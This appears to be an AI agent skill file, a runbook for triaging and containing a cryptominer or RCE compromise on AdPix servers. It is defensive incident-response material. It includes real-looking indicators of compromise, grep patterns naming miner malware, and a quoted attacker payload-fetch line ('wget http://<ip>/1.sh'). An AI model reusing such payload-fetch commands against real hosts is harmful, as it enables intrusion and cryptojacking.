---
name: adpix-incident
description: Triage + contain a suspected compromise on an AdPix node (cryptominer / RCE / data-loss outage). Use when a service shows "timeout"/outage but containers look up, CPU is pegged, a container runs unexpected /tmp binaries, or there are signs of intrusion. Tool-first: threat_scan (hunt → CLEAN/SUSPICIOUS/COMPROMISED) → quarantine (snapshot+stop+blockIp, confirm) → secret_rotate (confirm) → the 3-part incident report → handoff to adpix-harden.
---

# AdPix incident triage & containment

Prereq: read **adpix-devops**. Move carefully: containment is hard-to-reverse — confirm the compromise before killing/rebuilding, preserve evidence first, and for an active intrusion loop the operator in on destructive steps. This is the IR-2026-06-26 XMRig runbook, tool-ified. Full IR→tool map: **docs/incident-prevention.md**.

## Detection — run threat_scan FIRST
`threat_scan server=<host>` (read-only). One hunt covers what we used to grep by hand: known-miner/high-CPU processes, `/tmp` droppers (host + inside containers), outbound to mining-pool ports, public listeners beyond SSH/80/443, and containers running as **root shipping wget/curl** (the payload-download enabler). Returns findings by severity + a verdict **CLEAN / SUSPICIOUS / COMPROMISED**, and carries the prod1 IOCs (`77.90.13.20`, pool `:10128`, `/tmp/dashboard`, `.shchmod`). Tune `cpuThreshold` (default 80) if a legit job is noisy.

- COMPROMISED → note the container + C2 IP, go to Containment.
- SUSPICIOUS → reduce surface (harden_server, bind datastores loopback, non-root images).
- The classic mis-read: symptom looks like "ClickHouse timeout"/site not loading while containers report "running/healthy" — real cause is a pegged/leaked container starving the box, or a backend hung. threat_scan cuts through it.

**Manual fallback + for understanding** (if threat_scan can't reach, or to confirm a finding):
- `docker stats --no-stream` → a service at 100–300% CPU.
- `ps -ef | grep -E '/tmp/|--config|xmrig|miner|kdevtmpfsi|kinsing'`; inside the suspect: `docker exec <c> sh -c 'ps -ef; ls -la /tmp'` → ELF in /tmp run as root (`/tmp/dashboard --config /tmp/v.json`).
- `docker logs <web> | grep -iE 'wget|curl|exec|child_process|Command failed|saving to'` → app (Next.js) running `wget http://<ip>/1.sh` = app-layer RCE = the entry point.
- `ss -tnp` for outbound to the payload host; `docker inspect <c>` for the image; check `/etc/crontab`, `/etc/cron.d`, `authorized_keys` for host persistence.

## Containment — quarantine (preserve, then stop)
`quarantine server=<host> container=<name> stop:true blockIp:<C2> confirm:true`. It does the exact manual containment for you, in the safe order:
1. **Snapshots evidence** to `/root/ir-<ts>/` — `docker inspect`, logs, in-container ps + `/tmp`/`/dev/shm` listing, `docker diff`. This is **read-only and always runs**, even without `confirm` — run it bare first to preserve evidence with zero risk.
2. **Blocks egress** to the C2 (`blockIp`) — iptables DROP on host + DOCKER-USER.
3. **Stops** the container (`stop`) — kills the running payload.

`stop` / `blockIp` change the system → **confirm:true** required. **Copy `/root/ir-<ts>/` off-box before rebuilding.** Do NOT just restart the stopped container — its fs is untrusted; rebuild from a known-good, non-root, minimal image (Follow-through).

**Manual fallback** (only if quarantine is unavailable):
1. Evidence → `/root/ir-<date>/`: `docker cp` the dropped binary/config/dropper, `docker logs <c> > web.log`, `docker inspect <c> > inspect.json`, `sha256sum` the binary, capture cron/authorized_keys.
2. Egress: `iptables -I OUTPUT -d <ip> -j DROP` (keep it after).
3. Recreate clean (wipes /tmp): `docker compose -p adanalytics -f compose.yaml -f compose.prod.yaml up -d --force-recreate <svc>` — restart, don't just `stop`, so service returns.
4. Verify miner gone + load drops; service back to 200. Re-run threat_scan.
5. Check OTHER nodes for the same IOCs (was prod2 clean? grep /tmp, conns, ps).

## IOCs to record
binary SHA-256 · payload host/URL · mining pool + wallet + rig-id (from the miner `v.json`) · dropped file paths · the exact RCE command from logs. threat_scan/quarantine capture most of these; note them in the report + memory.

## Root cause + the 3-part report
The RCE is almost always reachable because the node ran the **wide-open dev compose** (datastores on 0.0.0.0, no firewall, SSH password auth) AND an app bug (a route doing `child_process` with user input / an old framework CVE). Write a **3-part incident report** (this structure worked — save under `~/adpix-incident-<date>/`):
1. **IdP / security** — is the IdP breached? It shares the blast radius even if not directly hit: rotate signing keys + OIDC client secrets + force global re-auth (secret_rotate reports these as assisted, with steps).
2. **Application bugs (developer)** — the RCE sink (grep `child_process/exec/spawn/eval`), framework upgrade (off Next.js 15.1.0, `npm audit`), run container non-root + minimal/distroless (no wget/shell), honest health checks, the ingest→ClickHouse `integrity_net_dict` data-loss bug.
3. **Server hardening (sysadmin/devops)** — firewall, bind datastores loopback, disable SSH password + fail2ban, egress lockdown, patch, rotate ALL exfiltrated secrets, rebuild the tainted host.

## Remediation — rotate, then lock down
- **Rotate exfiltrated secrets (IR 3.5):** `secret_rotate stack=<analytics|tagmanager|account>` (dry-run inventories + classifies the `.env`, values redacted) → `scope=all confirm:true` rotates **Postgres** (ALTER ROLE + rewrite DATABASE_URL), **Redis** (CONFIG SET requirepass), and **self-sourced app secrets** in place — each value is generated AND applied on the target, so it never transits the MCP; `.env` is backed up, consumers restarted, health verified. Follow the **assisted** steps it prints for ClickHouse (`ch_redeploy`), MinIO, the IdP signing key (new `kid` → force re-auth), OIDC client secret, and SMTP/Brevo — those need a stateful recreate or provider-side change, so they aren't auto-rotated.
- **Close the egress hole (IR 3.4):** the wget payload pull worked because container egress was unrestricted. Replace the hand-rolled iptables DROP with `egress_lockdown apply confirm:true` (default-deny via DOCKER-USER, allow established/DNS/private + `allowHosts`). Run `egress_lockdown report` first.
- **Deploy a tripwire:** `honeypot deploy confirm:true` — isolated decoy that logs attacker IPs; `honeypot report block:true` firewalls them. (Both wrapped by **adpix-harden**.)

## Follow-through
- **Patch the app RCE before re-exposing** — firewall/failover does NOT close an over-443 app hole. Until the dev ships the fix, any host serving the app is re-exploitable; `predeploy_gate` runs the adversarial review.
- Then run **adpix-harden** on the node (security_audit → harden_server + egress_lockdown + honeypot + patch_system). If the box is also undersized/tainted, prefer a clean rebuild via **adpix-host-migrate** (rebuild the host, not the cleaned container).
- Confirm CLEAN: re-run `threat_scan` + `security_audit`.
- Save the incident to memory (IOCs + remaining remediation).

## Related skills
**adpix-devops** (env + gotchas, read first) · **adpix-harden** (egress_lockdown + honeypot + audit/patch handoff) · **adpix-host-migrate** (clean rebuild of a tainted box).
